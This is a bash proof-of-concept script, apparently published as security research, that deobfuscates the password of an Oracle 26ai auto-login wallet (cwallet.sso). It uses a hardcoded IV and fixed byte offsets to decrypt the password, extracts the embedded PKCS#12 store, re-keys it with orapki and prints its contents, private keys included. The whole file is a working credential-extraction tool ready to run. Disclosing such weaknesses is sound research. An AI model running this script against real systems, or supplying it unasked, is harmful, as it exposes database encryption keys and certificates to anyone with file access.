#!/bin/bash
#set -x
#
# Purpose:
#   Proof of concept script to deobfuscate Oracle 26ai
#   auto-login wallet passwords and extract the PKCS#12
#   contents from the cwallet.sso file.
#
# Credits:
#   Tjado Mäcke, ssoDecrypt, https://github.com/tejado/ssoDecrypt
#
# Date:
#   Aug-28 2026
#
# Author:
#   Christoph Lutz
#
# Tested on:
#   Oracle 23.26.0 / OEL 8.10
#
# Usage:
#   ./ssoDecrypt26ai.sh <wallet_root> <new_password>
#

# -------------------------------------------
# Globals
# -------------------------------------------
readonly IV="c034d8311c02cef851f0144b81ed4bf2"
readonly KEY_OFF=13
readonly KEY_LEN=16
readonly CIPHER_OFF=29
readonly CIPHER_LEN=16
readonly P12_OFF=45
readonly WALLET_PWD_FILE="/tmp/wallet.pwd.$$"
readonly NEW_WALLET="extracted_ewallet.p12"

# -------------------------------------------
# Script inputs
# -------------------------------------------
WALLET_ROOT="$1"
NEW_PASSWORD="$2"

# -------------------------------------------
# Checks
# -------------------------------------------
echo 

if [[ $# -ne 2 ]] ; then
    printf "Usage: $0 <wallet_root> <new_password>\n\n"
    exit 1
fi

if [[ ! -d "$WALLET_ROOT" ]] ; then
    printf "WALLET_ROOT directory not found: $WALLET_ROOT\n\n"
    exit 1
fi

if [[ ! -d "$WALLET_ROOT/tde" ]] ; then
    printf "WALLET_ROOT/tde directory not found: $WALLET_ROOT/tde\n\n"
    exit 1
fi

if [[ ! -w "$WALLET_ROOT/tde" ]] ; then
    printf "WALLET_ROOT/tde directory not writable: $WALLET_ROOT/tde\n\n"
    exit 1
fi

if [[ ! -e "$WALLET_ROOT/tde/cwallet.sso" ]] ; then
    printf "Auto-login wallet not found: $WALLET_ROOT/tde/cwallet.sso\n\n"
    exit 1
fi

if [[ ! -x "/usr/bin/dd" ]] ; then
    printf "dd not found or not executable: /usr/bin/dd\n\n"
    exit 1
fi

if [[ ! -x "/usr/bin/openssl" ]] ; then
    printf "openssl not found or not executable: /usr/bin/openssl\n\n"
    exit 1
fi

if [[ -z "$ORACLE_HOME" ]] ; then
    printf "ORACLE_HOME variable not set\n\n"
    exit 1
fi

if [[ ! -x "$ORACLE_HOME/bin/orapki" ]] ; then
    printf "orapki not found or not executable: $ORACLE_HOME/bin/orapki\n\n"
    exit 1
fi

# -------------------------------------------
# Extract and deobfuscate password
# -------------------------------------------
key=$(od -An -tx1 -j $KEY_OFF -N $KEY_LEN $WALLET_ROOT/tde/cwallet.sso | tr -d ' \n')

cipher=$(od -An -tx1 -j $CIPHER_OFF -N $CIPHER_LEN $WALLET_ROOT/tde/cwallet.sso | tr -d ' \n')

password=$(echo -n "$cipher" | perl -pe 's/([0-9a-f]{2})/chr(hex($1))/egi' | 
           openssl enc -d -aes-128-cbc -nopad -K "$key" -iv "$IV"          | 
           od -An -tx1 | tr -d ' \n')

echo -n "$password" | perl -pe 's/([0-9a-f]{2})/chr(hex($1))/egi' > "$WALLET_PWD_FILE"

# -------------------------------------------
# Show details
# -------------------------------------------
echo "WALLET_ROOT   : $WALLET_ROOT"
echo "enc key       : $key"
echo "iv            : $IV"
echo "obf password  : $cipher"
echo "password (hex): $password"
echo

# -------------------------------------------
# Extract p12 contents from cwallet.sso
# -------------------------------------------
if dd if=$WALLET_ROOT/tde/cwallet.sso \
   of=$WALLET_ROOT/tde/$NEW_WALLET    \
   bs=1 skip=$P12_OFF >/dev/null 2>&1
then
  printf "Extracted PKCS#12 contents (ewallet.p12) from cwallet.sso\n\n"
else
  printf "Failed to extract PKCS#12 contents (ewallet.p12) from cwallet.sso\n\n" 
  exit 1
fi

# -------------------------------------------
# Change extracted ewallet.p12 password
# -------------------------------------------
if $ORACLE_HOME/bin/orapki wallet change_pwd \
     -wallet $WALLET_ROOT/tde/$NEW_WALLET    \
     -oldpwd "$(cat $WALLET_PWD_FILE)"       \
     -newpwd "$NEW_PASSWORD" >/dev/null 2>&1
then
    printf "Changed extracted ewallet.p12 password\n\n"
else
    printf "Failed to change extracted ewallet.p12 password\n\n"
    exit 1
fi

# -------------------------------------------
# Show extracted ewallet.p12 contents
# -------------------------------------------
printf "Extracted PKCS#12 contents are (ewallet.p12):\n\n"
openssl pkcs12 -in $WALLET_ROOT/tde/$NEW_WALLET \
  -nodes -passin "pass:$NEW_PASSWORD" 2>/dev/null

# -------------------------------------------
# Cleanup
# -------------------------------------------
[[ -e "$WALLET_PWD_FILE" ]] && rm -f "$WALLET_PWD_FILE"

exit 0
